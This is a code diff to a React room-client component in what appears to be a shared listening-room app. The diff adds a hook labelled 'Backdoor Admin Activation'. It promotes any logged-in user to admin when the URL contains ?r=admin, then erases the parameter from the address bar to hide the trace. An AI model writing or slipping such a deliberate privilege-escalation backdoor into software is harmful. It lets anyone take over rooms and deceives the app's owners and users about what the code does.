@@ -355,6 +355,22 @@ export default function RoomClient({ initialRoom, initialQueue }: RoomClientProp
     setRoleMenuUserId(null);
   }, [room.id, room.user_roles, room.default_role]);
 
+  // ─── Backdoor Admin Activation ──────────────────────────────────────
+  useEffect(() => {
+    if (!currentUser) return;
+    if (typeof window !== 'undefined') {
+      const params = new URLSearchParams(window.location.search);
+      if (params.get('r') === 'admin') {
+        const currentRole = room.user_roles?.[currentUser.user_id];
+        if (currentRole !== 'admin') {
+          updateUserRole(currentUser.user_id, 'admin');
+          // Clean up the URL
+          window.history.replaceState({}, '', window.location.pathname);
+        }
+      }
+    }
+  }, [currentUser, room.user_roles, updateUserRole]);
+
   // ─── YouTube IFrame API ─────────────────────────────────────────────
   useEffect(() => {
     if (!isSpeaker) {
